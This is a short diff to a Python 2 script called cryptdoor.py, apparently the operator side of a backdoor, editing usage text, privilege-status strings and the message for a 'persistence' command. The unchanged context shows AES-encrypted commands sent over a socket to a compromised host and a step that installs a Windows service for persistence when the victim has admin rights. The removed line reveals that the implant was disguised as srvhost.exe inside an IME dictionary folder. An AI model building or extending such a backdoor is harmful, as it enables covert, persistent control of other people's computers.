@@ -376,7 +376,7 @@ s.close()'''
 try:
 	hostname, portnumber = sys.argv[1], sys.argv[2]
 except:
-	print '  Usage ./cryptdoor.py host port'
+	print ' Usage ./cryptdoor.py host port (-p)'
 	exit()
 
 
@@ -445,7 +445,7 @@ def fnextcmd():
 	elif nextcmd.startswith('persistence'):
 		if isAdmin:
 			print ' [*] Installing system persistence service, win32svc..'
-			print ' [*] Persistence installed to C:\Windows\IME\imekr8\dicts\srvhost.exe'
+			print ' [*] Persistence installed.'
 			encrypted = EncodeAES(cipher, "persistence")
 			s.send(encrypted)
 			fmainloop(False)
@@ -559,9 +559,9 @@ while True:
 			uservar = 'SYSTEM'
 		else:
 			if isAdmin:
-				uservar = 'is Admin!'
+				uservar = 'Admin!'
 			else:
-				uservar = 'is not Admin'
+				uservar = 'not Admin'
 
 		print ' [*] AES-Encrypted connection established with %s:%s' % (address[0], address[1])
 		print ' [*] User is %s, System is %s %s.**n' % (uservar, archvar, opsys)
